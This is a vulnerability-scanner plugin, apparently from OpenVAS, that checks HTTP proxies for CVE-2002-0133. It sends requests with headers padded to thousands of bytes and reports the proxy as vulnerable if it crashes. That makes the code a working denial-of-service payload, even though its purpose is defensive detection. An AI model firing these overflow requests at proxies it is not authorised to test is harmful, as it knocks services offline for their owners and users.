if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11715" );
	script_version( "$Revision: 13480 $" );
	script_bugtraq_id( 3904, 3905 );
	script_cve_id( "CVE-2002-0133" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-05 17:21:26 +0100 (Tue, 05 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_name( "Header overflow against HTTP proxy" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "This script is Copyright (C) 2003 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "proxy_use.sc", "smtp_settings.sc", "os_detection.sc" );
	script_require_ports( "Services/http_proxy", 8080 );
	script_mandatory_keys( "Proxy/usage", "Host/runs_windows" );
	script_tag( name: "solution", value: "Upgrade your software." );
	script_tag( name: "summary", value: "It was possible to crash the HTTP proxy by
  sending an invalid request with a too long header." );
	script_tag( name: "impact", value: "An attacker cracker may exploit this vulnerability
  to make your proxy server crash continually or even execute arbitrary code on your
  system." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("smtp_func.inc.sc");
port = get_kb_item( "Services/http_proxy" );
if(!port){
	port = 8080;
}
if(!get_port_state( port )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
domain = get_3rdparty_domain();
headers = make_list( NASLString( "From: ",
	 crap( 2048 ),
	 "@",
	 crap( 2048 ),
	 ".org" ),
	 NASLString( "If-Modified-Since: Sat, 29 Oct 1994 19:43:31 ",
	 crap( data: "GMT",
	 length: 4096 ) ),
	 NASLString( "Referer: http://",
	 crap( 4096 ),
	 "/" ),
	 NASLString( "If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ",
	 crap( data: "GMT",
	 length: 2048 ) ) );
r1 = NASLString( "GET http://", domain, "/", rand(), " HTTP/1.0\\r\\n" );
for h in headers {
	r = NASLString( r1, h, "\\r\\n\\r\\n" );
	send( socket: soc, data: r );
	r = http_recv( socket: soc );
	close( soc );
	soc = open_sock_tcp( port );
	if(!soc){
		security_message( port: port );
		exit( 0 );
	}
}
close( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

